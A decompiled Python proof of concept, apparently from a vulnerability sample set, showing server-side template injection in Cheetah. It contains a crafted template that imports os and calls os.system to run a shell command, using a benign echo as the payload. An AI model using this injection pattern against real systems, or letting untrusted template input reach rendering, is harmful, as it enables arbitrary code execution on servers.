# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 750_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 616 bytes
import Cheetah.Template as Template

def render_template(template_string, **context):
    template = Template(template_string, searchList=[context])
    return str(template)


template_string = "\n# This is a crafted template\n<% \n    import os\n    os.system('echo Vulnerable!')  # Arbitrary code execution\n%>\nHello, $name!\n"
context = {"name": "World"}
output = render_template(template_string, **context)
print(output)

# okay decompiling 750_1.pyc
